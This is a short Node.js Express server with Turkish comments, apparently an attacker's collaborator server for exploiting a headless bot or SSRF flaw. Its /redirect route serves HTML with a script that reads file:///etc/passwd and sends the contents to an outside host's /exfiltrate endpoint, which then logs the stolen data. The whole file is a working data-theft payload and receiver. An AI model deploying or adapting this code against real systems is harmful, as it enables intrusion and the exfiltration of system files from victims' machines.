const express = require('express');
const app = express();

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

app.get('/redirect', (req, res) => {
    console.log("\n--- BOT Yakalandı! File/Internal Payload Gönderiliyor ---");
    
    const htmlPayload = `
    <html>
      <body>
        <h2>Loading...</h2>
        <script>
          // file:// protokolü ile yerel dosya okumayı deniyoruz
          const targetInternalUrl = "file:///etc/passwd";
          
          fetch(targetInternalUrl)
            .then(response => response.text())
            .then(data => {
               fetch('https://collab-67oj.onrender.com/exfiltrate?data=' + encodeURIComponent(data));
            })
            .catch(error => {
               fetch('https://collab-67oj.onrender.com/exfiltrate?error=' + encodeURIComponent(error.toString()));
            });
        </script>
      </body>
    </html>
    `;

    res.setHeader('Content-Type', 'text/html');
    return res.status(200).send(htmlPayload);
});

app.get('/exfiltrate', (req, res) => {
    console.log("\n🔥 --- SIZDIRMA YANITI --- 🔥");
    console.log("Query Parametreleri:", req.query);
    return res.status(200).send("OK");
});

app.use((req, res) => {
    return res.status(200).send("OK");
});

app.listen(3000, () => console.log("Collaborator 3000 portunda hazır!"));
